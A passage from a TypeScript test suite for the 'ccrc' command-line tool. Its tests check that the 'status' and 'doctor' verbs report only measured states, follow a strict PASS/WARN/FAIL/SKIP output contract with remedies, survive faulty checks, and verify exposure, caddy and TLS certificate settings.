      // the other was merely inactive fell into the `else` and was told "no
      // ccrc unit is active here" — a negative claim about a unit nobody
      // asked. Same class as the `connected` bug fixed one commit earlier:
      // asserting a state that was never measured.
      const line = roleFor(c, a);
      expect(line, 'partial evidence still produced a confident "neither"').not.toContain('neither');
      expect(line).toContain('unknown');
      expect(line, 'the unmeasured unit is not named, so nobody can tell which one to check')
        .toContain(names);
    });

    it.each([
      ['active', 'unknown', 'ccrc-agent.service'],
      ['unknown', 'active', 'ccrc.service'],
    ] as const)('(%s, %s) names the active unit AND says the other was never asked', (c, a, unasked) => {
      // The same rule pointing the other way. One unit is measurably active,
      // so the box IS at least that role — but "server" alone silently answers
      // the question "is it also a fleet host?", which nobody measured. The
      // single-box case (both active) is a real and different answer.
      const line = roleFor(c, a);
      expect(line).toContain(c === 'active' ? 'server' : 'fleet host');
      expect(line, 'the unasked unit is not named').toContain(unasked);
      expect(line).toMatch(/could not be asked|not measured/);
      expect(line, 'a half-measured box must not be reported as the single-box install')
        .not.toContain('a single-box install');
    });
  });

  it('counts the sessions the registry really holds, not a constant', () => {
    const home = statusBox('ccrc-status-sessions-');
    writeSessions(home, 7);
    expect(runDoctor(home, ['status']).stdout).toMatch(/sessions: +7\b/);
  });

  it('reads the stamp through version\'s own reader — one reader, two renderings', () => {
    // The pin against a second parser growing here: a dirty stamp is a fact
    // `version` already knows how to see, and status must see the same one.
    const home = statusBox('ccrc-status-dirty-');
    writeFileSync(join(home, '.ccrc', 'build.json'),
      JSON.stringify({ sha: 'deadbee', ref: 'feat/x', builtAt: '2026-08-15T01:00:00Z', dirty: true }));
    const out = runDoctor(home, ['status']).stdout;
    expect(out).toMatch(/build: +deadbee \(feat\/x\)/);
    expect(out).toMatch(/dirty/i);
    expect(runDoctor(home, ['version']).stdout).toMatch(/dirty/);
  });

  it('says "unstamped" rather than inventing a build when there is no stamp', () => {
    const home = statusBox('ccrc-status-unstamped-');
    rmSync(join(home, '.ccrc', 'build.json'), { force: true });
    const r = runDoctor(home, ['status']);
    expect(r.stdout).toMatch(/build: +unstamped/);
    expect(r.code).toBe(0);
  });

  it('reports a fleet it could not measure as NOT MEASURED, never as agreement', () => {
    const home = statusBox('ccrc-status-noaddr-');
    rmSync(join(home, '.ccrc', 'ccrc.env'), { force: true });
    const r = runDoctor(home, ['status']);
    expect(r.stdout).toMatch(/fleet: +not measured/);
    expect(r.stdout).not.toMatch(/fleet: +agreed/);
    expect(r.code).toBe(0);
  });

  it('says the GATE refused it, not "HTTP 401", when the gate is armed (D-150)', () => {
    // The second caller of `_box_health`, and it had the same misleading
    // sentence: `fleet: not measured (the server answered HTTP 401 …)`. Both
    // callers now read arm 9, so neither can drift back on its own.
    const home = statusBox('ccrc-status-gated-');
    stubHealth(home, '{"ok":false,"error":"unauthenticated","verdict":"no-session"}', 401);
    const r = runDoctor(home, ['status']);
    expect(r.stdout).toMatch(/fleet: +not measured/);
    expect(r.stdout).toMatch(/session gate is armed/);
    // It must read as EXPECTED, not as a fault — this is the state every armed
    // box is in, on every run.
    expect(r.stdout).toMatch(/not a fault/);
    expect(r.stdout).not.toMatch(/HTTP 401/);
    expect(r.code).toBe(0);
  });

  it('reports a skewed fleet as the fact it is, and still exits 0 — status judges nothing', () => {
    const home = statusBox('ccrc-status-skewed-');
    stubHealth(home, { mode: 'remote', connected: true, build: 'skewed', roster: 'agreed' });
    const r = runDoctor(home, ['status']);
    expect(r.stdout).toMatch(/fleet: +disagreed/);
    expect(r.stdout).toMatch(/build skewed/);
    expect(r.code).toBe(0);
    // …and doctor, on the same box, does not shrug at it.
    expect(runDoctor(home, ['doctor']).code).toBe(1);
  });

  it('will not say "agreed" over a link the server says is DOWN', () => {
    // Both halves agree, and the server is not in contact with the fleet host:
    // the answers describe the last contact. `agreed` is the strongest claim
    // this verb makes and it is not available here.
    const home = statusBox('ccrc-status-down-');
    stubHealth(home, { mode: 'remote', connected: false, build: 'agreed', roster: 'agreed' });
    const out = runDoctor(home, ['status']).stdout;
    expect(out).toMatch(/fleet: +stale/);
    expect(out).not.toMatch(/fleet: +agreed/);
    expect(out).toMatch(/NOT currently in contact/);
  });

  it('will not say "agreed" beside a `connected` it could not read either', () => {
    // The status half of the same defect: the line used to read
    // `fleet: agreed` directly under `mode: remote (fleet host connected: ?)`,
    // so the verb contradicted itself two lines apart.
    const home = statusBox('ccrc-status-conn-unknown-');
    stubHealth(home, { mode: 'remote', connected: 'yes', build: 'agreed', roster: 'agreed' });
    const out = runDoctor(home, ['status']).stdout;
    expect(out).toMatch(/connected: \?/);
    expect(out).toMatch(/fleet: +stale/);
    expect(out).not.toMatch(/fleet: +agreed/);
    expect(out).toMatch(/did not say whether it is in contact/);
  });

  it('says so when the server is in local mode, rather than reporting agreement', () => {
    const home = statusBox('ccrc-status-local-');
    stubHealth(home, { mode: 'local', connected: true, build: 'unknown', roster: 'unknown' });
    const out = runDoctor(home, ['status']).stdout;
    expect(out).toMatch(/fleet: +not measured/);
    expect(out).toMatch(/local mode/);
  });

  it('never asks anything but the health route, and asks it once', () => {
    const home = statusBox('ccrc-status-readonly-');
    runDoctor(home, ['status']);
    const calls = curlCalls(home);
    expect(calls.length).toBe(1);
    expect(calls[0]).toContain('/api/fleet/health');
    // Read-only in the strongest sense available here: no method flag at all,
    // which is a GET, and no request body.
    expect(calls[0]).not.toMatch(/-X|--request|--data|-d\b/);
  });

  it('refuses an argument, exit 2, like every other verb', () => {
    const home = statusBox('ccrc-status-args-');
    const r = runDoctor(home, ['status', '--all']);
    expect(r.code).toBe(2);
    expect(r.stderr).toMatch(/^ccrc: unknown argument: --all/m);
  });

  it('names units that really exist in deploy/, not two plausible strings', () => {
    const src = readFileSync(CCRC_SRC, 'utf8');
    const units = [...src.matchAll(/\b(ccrc(?:-agent)?\.service)\b/g)].map((m) => m[1]);
    expect(new Set(units)).toEqual(new Set(['ccrc.service', 'ccrc-agent.service']));
    for (const u of new Set(units)) expect(existsSync(join(REPO, 'deploy', u!)), u).toBe(true);
  });
});


// ── the wrapper-shape library's own contract ──────────────────────────────

describe('ccrc doctor: ccrc-wrapper-shape', () => {
  it('_wrap_set_diff does not shadow its caller\'s locals inside the callback', () => {
    // The callback runs INSIDE _wrap_set_diff's scope — that is the whole
    // mechanism, and it is why every local in there is `_wrap_*`-prefixed. A
    // bare `local x y found` (which is what it shipped with) handed the
    // callback the loop's own `x` in place of the caller's, silently, for
    // exactly as long as nobody happened to name a variable `x`.
    const script = [
      'set -uo pipefail',
      `. ${shq(LIB_SRC)}`,
      'note() { printf "%s saw x=%s y=%s found=%s\\n" "$2" "$x" "$y" "$found"; }',
      'outer() {',
      '  local x=OUTER-X y=OUTER-Y found=OUTER-FOUND',
      '  local -a mine=(only-in-a) theirs=()',
      '  _wrap_set_diff note mine theirs',
      '}',
      'outer',
    ].join('\n');
    const r = spawnSync(BASH, ['-c', script], { encoding: 'utf8' });
    expect(r.stderr).toBe('');
    expect(r.stdout.trim()).toBe('only-in-a saw x=OUTER-X y=OUTER-Y found=OUTER-FOUND');
  });
});


// ── the output contract ───────────────────────────────────────────────────

describe('ccrc doctor: the output contract', () => {
  it('names a remedy for EVERY failing check — a check with no remedy is a complaint', () => {
    // Asserted per FAIL line, not once over the whole output: a single stray
    // "remedy:" anywhere would satisfy the weaker form while nine checks
    // shipped without one.
    const lines = runDoctor(broken('ccrc-doctor-remedy-')).stdout.split('\n');
    const fails = lines.map((l, i) => [l, i] as const).filter(([l]) => l.startsWith('FAIL'));
    expect(fails.length, 'the broken fixture must actually fail something').toBeGreaterThan(0);
    for (const [line, i] of fails)
      expect(lines[i + 1], `no remedy after: ${line}`).toMatch(/^ {2}remedy: \S/);
  });

  it('names a remedy after a WARN too', () => {
    const home = healthy('ccrc-doctor-remedy-warn-');
    ghStub(home, ['github.com', '  - Logged in to github.com account fixture-bot (oauth_token)'], 0);
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('WARN '));
    expect(i, 'this fixture must produce a WARN').toBeGreaterThan(-1);
    expect(lines[i + 1]).toMatch(/^ {2}remedy: \S/);
  });

  it('every line is exactly PASS|WARN|FAIL|SKIP <name>: <detail>', () => {
    // SKIP is in the alternation and NOT in the verdict count: a check that did
    // not run has not answered, and counting it as an answer is the whole
    // defect the skip exists to avoid. Both fixtures are walked, because the
    // healthy box's own skip (`HEALTHY_SKIPS` — `models`, everywhere, plus
    // `scopes` on macOS) is not zero on either platform any more, and the
    // address-less one has exactly two ADDITIONAL skips on top of that —
    // `fleet` and, since Stage 4 Task 9, `build`, each for its own reading of
    // the same missing address. `HEALTHY_SKIPS` is added to both below for
    // exactly that reason: it is not something only a platform quirk adds,
    // it is the healthy box's own baseline now.
    const home = healthy('ccrc-doctor-shape-');
    ghStub(home, ['github.com', '  - Logged in to github.com account fixture-bot (oauth_token)'], 0);
    const skipBox = healthy('ccrc-doctor-shape-skip-');
    rmSync(join(skipBox, '.ccrc', 'ccrc.env'), { force: true });
    // THE NAME HALF IS DERIVED FROM THE TABLE, not spelled as a charset
    // (D-1345). It used to read `[a-z0-9_]+`, which was never a rule anybody
    // stated — it was the alphabet every check id happened to use — and R3's
    // `graphify-path`, whose hyphen the spec and `_check_graphify-path`'s own
    // header both choose deliberately, made it a false verdict about the SHAPE
    // this test is named for: `PASS graphify-path: …` is exactly
    // `<VERDICT> <name>: <detail>`. Deriving the alternation from
    // `CCRC_DOCTOR_CHECKS` is this project's own "enumerate once, derive" rule
    // and it is STRICTER than any charset — a verdict printed under a name the
    // table does not carry is now red here, where the old regex accepted it.
    const nameAlt = tableNames()
      .map((n) => n.replace(/[.*+?^${}()|[\]\\-]/g, '\\$&')).join('|');
    const shape = new RegExp(`^(PASS|WARN|FAIL|SKIP) (${nameAlt}): \\S`);
    for (const [h, wantSkips] of [
      [home, HEALTHY_SKIPS], [skipBox, 2 + HEALTHY_SKIPS],
    ] as const) {
      let verdicts = 0; let skips = 0;
      for (const l of runDoctor(h).stdout.split('\n')) {
        if (!l || l.startsWith('  remedy: ') || l.startsWith('summary: ')) continue;
        expect(l).toMatch(shape);
        if (l.startsWith('SKIP ')) skips++; else verdicts++;
      }
      // Without this the loop above is a scan over an empty list, which passes
      // everything — the exact vacuity this suite's red run exhibited.
      expect(skips).toBe(wantSkips);
      expect(verdicts).toBe(tableNames().length - wantSkips);
    }
  });

  it('exits 1 when any check fails and 0 when every check passes or warns', () => {
    expect(runDoctor(broken('ccrc-doctor-exit-bad-')).code).toBe(1);
    expect(runDoctor(healthy('ccrc-doctor-exit-ok-')).code).toBe(0);
  });

  it('prints a summary count LAST, and it adds up to the table', () => {
    const home = healthy('ccrc-doctor-summary-');
    const r = runDoctor(home);
    const lines = r.stdout.split('\n').filter(Boolean);
    const last = lines[lines.length - 1] ?? '';
    const m = /^summary: (\d+) checks \((\d+) skipped\), (\d+) verdicts — (\d+) passed, (\d+) warned, (\d+) failed$/.exec(last);
    expect(m, `last line was: ${last}`).toBeTruthy();
    const [total, skipped, verdicts, pass, warn, fail] = m!.slice(1).map(Number);
    expect(total).toBe(tableNames().length);
    expect(pass + warn + fail).toBe(verdicts);
    // On a HEALTHY box every check answers exactly once EXCEPT the
    // `HEALTHY_SKIPS` checks that legitimately SKIP (`models`, everywhere;
    // `scopes` too on macOS) — which is what makes the two-class run's
    // disagreement meaningful by contrast. A SKIP is an answer but NOT a
    // verdict (cmd_doctor counts them apart), so a box with `HEALTHY_SKIPS`
    // legitimate skips has that many fewer verdicts than checks. On Linux
    // `HEALTHY_SKIPS` is 1, not 0 — the skip is real now, not a
    // Darwin-only special case.
    expect(verdicts).toBe(total - HEALTHY_SKIPS);
    expect(skipped).toBe(HEALTHY_SKIPS);
    expect(fail).toBe(0);
    // A HEALTHY macOS BOX CARRIES EXACTLY ONE STANDING WARN, and it is not a
    // fault to be fixed: `linger` has no counterpart on a platform where a
    // LaunchAgent lives and dies with the login session. The arithmetic above
    // is the property this test is really about and it holds on both; what
    // differs is how many verdicts a correct box is entitled to warn about.
    if (process.platform === 'darwin') {
      expect(warn).toBe(1);
      expect(lineFor(r.stdout, 'linger')).toMatch(/^WARN linger: not a macOS concept/);
    } else {
      expect(warn).toBe(0);
    }
  });

  it('a healthy box says nothing on stderr — the verdicts are the RESULT, on stdout', () => {
    const home = healthy('ccrc-doctor-stderr-');
    const r = runDoctor(home);
    expect(r.stderr).toBe('');
    expect(r.code).toBe(0);
  });

  it('refuses an argument, exit 2, like every other verb', () => {
    const home = healthy('ccrc-doctor-args-');
    const r = runDoctor(home, ['doctor', '--all']);
    expect(r.code).toBe(2);
    expect(r.stderr).toMatch(/^ccrc: unknown argument: --all/m);
  });

  it('a table entry with no _check_ function FAILS loudly and blames ccrc, not the box', () => {
    // The table and its implementations are two files' worth of one thing; if
    // they drift, the entry must not be silently skipped — a skipped check is
    // a check that reports nothing and lets the summary claim a clean box.
    const home = healthy('ccrc-doctor-orphan-entry-');
    writeChecks(home, 'CCRC_DOCTOR_CHECKS=(ghost)\n');
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL ghost: '));
    expect(i, r.stdout).toBeGreaterThan(-1);
    expect(lines[i]).toMatch(/no _check_ghost function exists/);
    expect(lines[i + 1]).toMatch(/^ {2}remedy: .*bug in ccrc/);
    expect(r.code).toBe(1);
  });

  it('one check that DIES mid-run does not take the rest of the table with it', () => {
    // `set -u` (which ccrc runs under, and must) makes an unbound variable
    // FATAL to the shell it happens in — not a `return 1`. Called directly,
    // one such check ended the whole run: no summary, and every later check
    // silently unmeasured, which is exactly what doctor exists not to do. Each
    // check therefore runs in a subshell.
    const home = healthy('ccrc-doctor-fatal-check-');
    writeChecks(home, [
      'CCRC_DOCTOR_CHECKS=(alpha boom omega)',
      '_check_alpha() { printf "PASS alpha: measured\\n"; }',
      '_check_boom()  { printf "%s\\n" "$CCRC_NOT_SET_ANYWHERE"; }',
      '_check_omega() { printf "PASS omega: measured\\n"; }',
      '',
    ].join('\n'));
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    expect(r.stdout).toMatch(/^PASS alpha: measured$/m);
    // The explosion is reported as a bug in ccrc, with a remedy, in the dead
    // check's own name — not as a missing line.
    const i = lines.findIndex((l) => l.startsWith('FAIL boom: '));
    expect(i, r.stdout).toBeGreaterThan(-1);
    expect(lines[i]).toMatch(/printed no verdict line of its own/);
    expect(lines[i + 1]).toMatch(/^ {2}remedy: .*bug in ccrc/);
    // The run CONTINUED past it, and still added up.
    expect(r.stdout).toMatch(/^PASS omega: measured$/m);
    expect(r.stdout).toMatch(/^summary: 3 checks \(0 skipped\), 3 verdicts — 2 passed, 0 warned, 1 failed$/m);
    expect(r.code).toBe(1);
    // bash's own diagnosis is not swallowed — stderr is deliberately not captured.
    expect(r.stderr).toMatch(/unbound variable/);
  });

  it('a check that answers with an illegal status is a bug, not a fifth outcome', () => {
    const home = healthy('ccrc-doctor-bad-status-');
    writeChecks(home,
      'CCRC_DOCTOR_CHECKS=(weird)\n'
      + '_check_weird() { printf "PASS weird: printed a verdict, then lied\\n"; return 4; }\n');
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL weird: '));
    expect(i, r.stdout).toBeGreaterThan(-1);
    expect(lines[i]).toMatch(/exited 4, which is not one of 0 \(pass\), 1 \(fail\), 2 \(warn\) or 3 \(skipped\)/);
    expect(lines[i + 1]).toMatch(/^ {2}remedy: \S/);
    expect(r.code).toBe(1);
  });

  // ── the FOURTH outcome: a check that did not run ────────────────────────
  // A check with nothing to measure (`fleet` on a box with no server to ask)
  // must not report a PASS it never earned, and must not report a WARN either —
  // there is nothing wrong. It prints ONE `SKIP <name>: <detail>` line, no
  // verdict line, and exits 3; the runner counts it against CHECKS and not
  // against verdicts, so the summary's two nouns stay honest.
  it('counts a SKIP as a check that did not answer, never as one that passed', () => {
    const home = healthy('ccrc-doctor-skip-count-');
    writeChecks(home, [
      'CCRC_DOCTOR_CHECKS=(alpha nothing)',
      '_check_alpha()   { printf "PASS alpha: measured\\n"; }',
      '_check_nothing() { printf "SKIP nothing: there was nothing here to measure\\n"; return 3; }',
      '',
    ].join('\n'));
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^SKIP nothing: there was nothing here to measure$/m);
    expect(r.stdout).toMatch(/^summary: 2 checks \(1 skipped\), 1 verdicts — 1 passed, 0 warned, 0 failed$/m);
    expect(r.code).toBe(0);
  });

  it('a check that exits 3 while printing a VERDICT is a bug, not a skip', () => {
    // The two halves of the skip are cross-checked against each other, exactly
    // as the return code and the verdict lines already are: "I did not run" and
    // "here is my answer" cannot both be true.
    const home = healthy('ccrc-doctor-skip-and-verdict-');
    writeChecks(home,
      'CCRC_DOCTOR_CHECKS=(liar)\n'
      + '_check_liar() { printf "PASS liar: measured\\n"; return 3; }\n');
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL liar: '));
    expect(i, r.stdout).toBeGreaterThan(-1);
    expect(lines[i]).toMatch(/a skipped check prints exactly one SKIP line/);
    expect(lines[i + 1]).toMatch(/^ {2}remedy: .*bug in ccrc/);
    expect(r.code).toBe(1);
  });

  it('a SKIP line with a return code that is not 3 is a bug too', () => {
    // The other direction. Without this, a check could print SKIP and exit 0,
    // and the summary would count a measurement nobody made.
    const home = healthy('ccrc-doctor-skip-rc0-');
    writeChecks(home,
      'CCRC_DOCTOR_CHECKS=(sneak)\n'
      + '_check_sneak() { printf "SKIP sneak: nothing to do\\n"; return 0; }\n');
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL sneak: .*a skipped check prints exactly one SKIP line/m);
    expect(r.stdout).toMatch(/^summary: 1 checks \(0 skipped\), 1 verdicts — 0 passed, 0 warned, 1 failed$/m);
    expect(r.code).toBe(1);
  });

  it('a check that exits 3 and prints NOTHING is a bug — a skip owes a reason', () => {
    // An invisible skip is a check that vanished from the run. The detail is
    // the whole difference between "this box has no server to ask" and a
    // silence the operator has to reverse-engineer from a count.
    const home = healthy('ccrc-doctor-skip-silent-');
    writeChecks(home,
      'CCRC_DOCTOR_CHECKS=(mute)\n'
      + '_check_mute() { return 3; }\n');
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL mute: /m);
    expect(r.code).toBe(1);
  });

  it('counts a check that answers in TWO classes in both, and reports both lines', () => {
    // The runner half of the wrappers split: a check with findings of two
    // classes prints a line each and returns the WORSE. The tally is over
    // verdict lines, so the summary shows both — and, deliberately, more
    // verdicts than checks.
    const home = healthy('ccrc-doctor-two-class-count-');
    writeChecks(home, [
      'CCRC_DOCTOR_CHECKS=(dual)',
      '_check_dual() {',
      '  printf "FAIL dual: a real defect\\n  remedy: fix it\\n"',
      '  printf "WARN dual: something deliberate\\n  remedy: or leave it\\n"',
      '  return 1',
      '}',
      '',
    ].join('\n'));
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL dual: a real defect$/m);
    expect(r.stdout).toMatch(/^WARN dual: something deliberate$/m);
    expect(r.stdout).toMatch(/^summary: 1 checks \(0 skipped\), 2 verdicts — 0 passed, 1 warned, 1 failed$/m);
    expect(r.code).toBe(1);
  });

  it('a verdict line for ANOTHER check does not count as this one answering', () => {
    // The tally matches `PASS <name>: `, with the name bound — not a bare
    // `PASS `. A check that prints somebody else's verdict has not answered
    // for itself, and counting it as though it had is how a check that was
    // never wired up rides in on its neighbour's line. All three classes,
    // because the matcher has three arms and loosening any one of them was
    // green before this test.
    const home = healthy('ccrc-doctor-wrong-name-');
    writeChecks(home, [
      'CCRC_DOCTOR_CHECKS=(alpha beta gamma)',
      '_check_alpha() { printf "PASS other: not my name\\n"; return 0; }',
      '_check_beta()  { printf "WARN other: not my name\\n  remedy: x\\n"; return 2; }',
      '_check_gamma() { printf "FAIL other: not my name\\n  remedy: x\\n"; return 1; }',
      '',
    ].join('\n'));
    const r = runDoctor(home);
    for (const n of ['alpha', 'beta', 'gamma'])
      expect(r.stdout, r.stdout).toMatch(new RegExp(`^FAIL ${n}: the check printed no verdict line of its own`, 'm'));
    expect(r.stdout).toMatch(/^summary: 3 checks \(0 skipped\), 3 verdicts — 0 passed, 0 warned, 3 failed$/m);
    expect(r.code).toBe(1);
  });

  it('a return code that disagrees with the verdict lines is a bug, not an answer', () => {
    // Counting the LINES moved the tally off the return code; this is what
    // keeps the code from becoming decoration. A check that returns 1 while
    // printing only a WARN would otherwise have made doctor exit 0 — silently
    // downgrading a failure to a warning.
    const home = healthy('ccrc-doctor-rc-mismatch-');
    writeChecks(home,
      'CCRC_DOCTOR_CHECKS=(liar)\n'
      + '_check_liar() { printf "WARN liar: measured\\n  remedy: do something\\n"; return 1; }\n');
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL liar: '));
    expect(i, r.stdout).toBeGreaterThan(-1);
    expect(lines[i]).toMatch(/exited 1, but the worst verdict line it printed is a WARN, which is 2/);
    expect(lines[i + 1]).toMatch(/^ {2}remedy: .*bug in ccrc/);
    expect(r.stdout).toMatch(/^summary: 1 checks \(0 skipped\), 1 verdicts — 0 passed, 0 warned, 1 failed$/m);
    expect(r.code).toBe(1);
  });

  it('refuses an EMPTY check table rather than reporting a box nobody measured', () => {
    const home = healthy('ccrc-doctor-empty-table-');
    writeChecks(home, 'CCRC_DOCTOR_CHECKS=()\n');
    const r = runDoctor(home);
    expect(r.code).toBe(1);
    expect(r.stdout).toBe('');
    expect(r.stderr).toMatch(/^ccrc: doctor's check table is empty/m);
  });

  it('refuses a check table file that declares no table at all', () => {
    const home = healthy('ccrc-doctor-no-table-');
    writeChecks(home, '# nothing here\n');
    const r = runDoctor(home);
    expect(r.code).toBe(1);
    expect(r.stdout).toBe('');
    expect(r.stderr).toMatch(/^ccrc: doctor's check table declares no CCRC_DOCTOR_CHECKS/m);
  });

  it('refuses to run at all when its check table is missing, rather than passing vacuously', () => {
    // A doctor that finds no checks and exits 0 is the worst possible failure
    // mode: it reports a healthy box by measuring nothing.
    const home = healthy('ccrc-doctor-nochecks-');
    rmSync(join(home, 'ccrc', 'ccd', 'ccrc-doctor-checks'), { force: true });
    const r = runDoctor(home);
    expect(r.code).toBe(1);
    expect(r.stdout).toBe('');
    expect(r.stderr).toMatch(/^ccrc: doctor's check table is missing/m);
  });
});


describe('ccrc doctor: exposure', () => {
  it('SKIPs when the box was never exposed — a BYO proxy or a pre-3b box is an end state, not a fault', () => {
    const home = healthy('ccrc-doctor-exposure-skip-');
    rmSync(join(home, '.ccrc', 'exposure.env'), { force: true });
    const r = runDoctor(home);
    const l = skipLineFor(r.stdout, 'exposure');
    expect(l, r.stdout).toBeTruthy();
    expect(l).toContain('not configured');
    expect(l).toContain('pre-3b');
    // The SKIP contract: no verdict line, and no remedy under it.
    expect(r.stdout).not.toMatch(/^(PASS|WARN|FAIL) exposure: /m);
  });

  it('PASSes naming the origin when the file is 0600 and both origin keys are set', () => {
    const home = healthy('ccrc-doctor-exposure-ok-');
    const r = runDoctor(home);
    const l = lineFor(r.stdout, 'exposure');
    expect(l, r.stdout).toMatch(/^PASS exposure: /);
    expect(l).toContain(`https://${EXPOSED_HOST}`);
  });

  it('never prints the token — not in any verdict, any remedy, or anywhere else in a full run', () => {
    const home = healthy('ccrc-doctor-exposure-token-');
    const r = runDoctor(home);
    expect(r.stdout).not.toContain(CANARY_TOKEN);
    expect(r.stderr).not.toContain(CANARY_TOKEN);
  });

  it('FAILs with the ccrc expose remedy when the mode is not 0600', () => {
    const home = healthy('ccrc-doctor-exposure-mode-');
    chmodSync(join(home, '.ccrc', 'exposure.env'), 0o644);
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL exposure: '));
    expect(i, r.stdout).toBeGreaterThan(-1);
    expect(lines[i]).toContain('644');
    expect(lines[i + 1]).toContain('ccrc expose');
    expect(r.code).toBe(1);
  });

  it('FAILs with the ccrc expose remedy when an origin key is missing', () => {
    const home = healthy('ccrc-doctor-exposure-key-');
    writeExposureEnv(home, { omit: ['CCRC_RP_ID'] });
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL exposure: '));
    expect(i, r.stdout).toBeGreaterThan(-1);
    expect(lines[i]).toContain('CCRC_RP_ID');
    expect(lines[i + 1]).toContain('ccrc expose');
  });

  it('PASSes mode ip with no rp id at all — passphrase-only is the design, not a gap', () => {
    // Stage 5, S10: `ccrc expose ip` writes no CCRC_RP_ID (an rpId must be a
    // domain), so the missing-key FAIL above must not fire when the file says
    // CCRC_EXPOSE_MODE=ip. The mutation this pins: drop the mode read and the
    // check FAILs every ip box on the key its own verb refuses to write.
    const home = healthy('ccrc-doctor-exposure-ip-');
    writeExposureEnv(home, { ip: '203.0.113.7' });
    const r = runDoctor(home);
    const l = lineFor(r.stdout, 'exposure');
    expect(l, r.stdout).toMatch(/^PASS exposure: /);
    expect(l).toContain('https://203.0.113.7');
    expect(l).toContain('mode ip');
  });
});


describe('ccrc doctor: caddy', () => {
  it('SKIPs without exposure — no proxy is owed on a box that never ran the verb', () => {
    const home = healthy('ccrc-doctor-caddy-skip-');
    rmSync(join(home, '.ccrc', 'exposure.env'), { force: true });
    const r = runDoctor(home);
    expect(skipLineFor(r.stdout, 'caddy'), r.stdout).toBeTruthy();
    expect(r.stdout).not.toMatch(/^(PASS|WARN|FAIL) caddy: /m);
  });

  it('PASSes when the caddy SYSTEM unit is active', () => {
    // The stub answers system-scope `is-active caddy` from its own fixture
    // file and `--user is-active caddy` from a different (absent) one — so
    // reaching this PASS at all pins the scope: a check that asked systemd's
    // user manager would find nothing and FAIL here.
    const home = healthy('ccrc-doctor-caddy-ok-');
    const r = runDoctor(home);
    expect(lineFor(r.stdout, 'caddy'), r.stdout).toMatch(/^PASS caddy: /);
  });

  it('FAILs with the sudo ceremony when exposure is configured but the unit is not active', () => {
    const home = healthy('ccrc-doctor-caddy-dead-');
    writeFileSync(join(home, 'fixture-system-unit-caddy'), 'inactive\n');
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL caddy: '));
    expect(i, r.stdout).toBeGreaterThan(-1);
    expect(lines[i]).toContain('inactive');       // systemd's own word, quoted back
    // The remedy IS the D2 ceremony — all three steps, so an operator can act
    // on the line without going back to the expose transcript.
    expect(lines[i + 1]).toContain('install caddy');
    // The destination the remedy PRINTS is the one the `caddyfile` check
    // MEASURES — the same constant, so a fixture redirect moves both or
    // neither. Asserting the literal /etc path here would have passed while
    // the two drifted apart (D-166).
    expect(lines[i + 1]).toContain(sysCaddyfile(home));
    expect(lines[i + 1]).toContain('enable --now caddy');
    // D-165: never the symlink form. It cannot work — caddy runs as its own
    // user and cannot traverse `$HOME/.ccrc` (0700, ccrc's own doing).
    expect(lines[i + 1], 'a symlink remedy the caddy user could not follow')
      .not.toContain('ln -s');
    expect(r.code).toBe(1);
  });

  it('SKIPs when there is no systemctl at all — a container or dev box cannot run a system unit', () => {
    const home = healthy('ccrc-doctor-caddy-nosystemctl-');
    // THE SYSTEM systemd, not the user one: this is the caddy check, which asks
    // about a SYSTEM unit. `systemctl` by name is right here on both platforms —
    // macOS has none either, and the check's SKIP is the same verdict for the
    // same reason.
    unstub(home, 'systemctl');
    const r = runDoctor(home);
    // `services` FAILs beside it (that box has user unit FILES and nothing to
    // ask about them — its own finding); the caddy check itself must skip.
    expect(skipLineFor(r.stdout, 'caddy'), r.stdout).toBeTruthy();
    expect(r.stdout).not.toMatch(/^(PASS|WARN|FAIL) caddy: /m);
  });
});


describe('ccrc doctor: cert', () => {
  it('SKIPs without exposure — there is no certificate this box is supposed to serve', () => {
    const home = healthy('ccrc-doctor-cert-skip-');
    rmSync(join(home, '.ccrc', 'exposure.env'), { force: true });
    const r = runDoctor(home);
    expect(skipLineFor(r.stdout, 'cert'), r.stdout).toBeTruthy();
    expect(r.stdout).not.toMatch(/^(PASS|WARN|FAIL) cert: /m);
  });

  it('PASSes naming the days when the served cert is at least 14 days out — measured on the LOOPBACK listener with SNI', () => {
    const home = healthy('ccrc-doctor-cert-ok-');
    const r = runDoctor(home);
    const l = lineFor(r.stdout, 'cert');
    expect(l, r.stdout).toMatch(/^PASS cert: /);
    const m = /(\d+) days/.exec(l ?? '');
    expect(m, `no day count in: ${l}`).toBeTruthy();
    expect(Number(m![1])).toBeGreaterThanOrEqual(85);
    expect(Number(m![1])).toBeLessThanOrEqual(90);
    // The probe went to 127.0.0.1:443 with the origin's host in SNI — before
    // DNS propagates and independent of the WAN path (spec D6).
    const calls = readFileSync(join(home, 'openssl-calls'), 'utf8');
    expect(calls).toContain('-connect 127.0.0.1:443');
    expect(calls).toContain(`-servername ${EXPOSED_HOST}`);
  });

  // Live finding, 2026-08-21 ceremony: caddy CAN bind one interface only —
  // tailscaled held the tailnet IP's :471, so caddy took the public IP and
  // loopback refused. A loopback-only probe FAILed a box that was serving a
  // perfectly good certificate. The probe now walks loopback first, then the
  // box's own addresses (`hostname -I`, the name check's source), and
  // measures the first listener that answers.
  it('falls back to the box\'s own addresses when loopback refuses — caddy bound to one interface is not a missing cert', () => {
    const home = healthy('ccrc-doctor-cert-onebind-');
    writeFileSync(join(home, 'fixture-tls-refused-addrs'), '127.0.0.1\n');
    writeFileSync(join(home, 'fixture-host-ips'), '203.0.113.7 10.0.0.5\n');
    const r = runDoctor(home);
    const l = lineFor(r.stdout, 'cert');
    expect(l, r.stdout).toMatch(/^PASS cert: /);
    expect(l).toContain('203.0.113.7');
    // Loopback was still tried FIRST — the fallback is ordered, not a swap.
